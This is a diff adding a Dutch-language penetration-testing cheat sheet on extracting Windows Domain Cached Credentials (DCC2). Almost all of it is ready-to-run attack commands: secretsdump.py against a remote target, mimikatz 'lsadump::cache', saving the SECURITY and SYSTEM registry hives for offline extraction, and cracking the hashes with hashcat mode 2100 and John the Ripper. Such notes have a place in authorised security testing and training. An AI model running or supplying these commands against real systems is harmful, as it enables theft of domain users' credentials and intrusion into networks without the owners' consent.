@@ -1,0 +1,30 @@
+# Cached Credentials (DCC2) — Domain Cached Credentials ophalen
+# Windows cachet de laatste 10 domain logins voor offline authenticatie
+# DCC2 hashes zijn LANGZAAM te kraken (PBKDF2-based)
+#
+# === Vereisten ===
+# - Local admin / SYSTEM toegang op doelwit
+#
+# === Voorbeelden ===
+
+# secretsdump.py - Remote DCC2 hashes ophalen
+python3 secretsdump.py DOMAIN/ADMIN:'PASS'@TARGET_IP -outputfile dcc2
+
+# Mimikatz - Cached credentials dumpen
+mimikatz.exe "privilege::debug" "lsadump::cache" exit
+
+# Uit registry hive extractie
+reg save HKLM\SECURITY security.hive
+reg save HKLM\SYSTEM system.hive
+python3 secretsdump.py -security security.hive -system system.hive LOCAL
+
+# Kraken met hashcat (mode 2100 = DCC2)
+hashcat -m 2100 dcc2_hashes.txt wordlist.txt
+
+# Kraken met john
+john --format=mscash2 dcc2_hashes.txt --wordlist=wordlist.txt
+
+# Noot: DCC2 = MS-CacheDCredentialV2 (PBKDF2 met 10240 iteraties)
+# Noot: Veel langzamer te kraken dan NTLM (factor ~1000x)
+# Noot: Standaard worden de laatste 10 logins gecachet (CachedLogonsCount)
+# Noot: Nuttig als DC niet bereikbaar is maar users eerder hebben ingelogd
